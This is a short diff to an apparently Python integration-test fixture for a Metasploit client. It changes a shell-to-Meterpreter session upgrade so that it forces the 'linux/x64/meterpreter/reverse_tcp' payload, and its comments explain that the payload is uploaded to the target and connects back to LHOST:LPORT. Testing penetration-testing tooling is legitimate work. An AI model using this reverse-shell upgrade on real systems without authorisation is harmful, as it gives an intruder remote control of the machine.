@@ -440,10 +440,21 @@ async def direct_meterpreter_session(client, direct_shell_session, integration_e
         # - Uploads it to the target
         # - Executes it
         # - The payload connects back to LHOST:LPORT
-        print("   Initiating upgrade...")
+        #
+        # NOTE: We use PAYLOAD_OVERRIDE to force x64 Meterpreter because:
+        # 1. MSF's shell_to_meterpreter has a bug where regex /86/ matches both x86 and x86_64
+        # 2. x86/linux Meterpreter has limited functionality (no transport operations)
+        # 3. x64 Meterpreter provides full feature support
+        print("   Initiating upgrade (forcing x64 payload)...")
         try:
             result = await client.session_shell_to_meterpreter(
-                shell_session_id, lhost, lport
+                shell_session_id,
+                lhost,
+                lport,
+                extra_options={
+                    "PAYLOAD_OVERRIDE": "linux/x64/meterpreter/reverse_tcp",
+                    "PLATFORM_OVERRIDE": "linux",
+                },
             )
             print(f"   Upgrade initiated: {result}")
         except Exception as e:
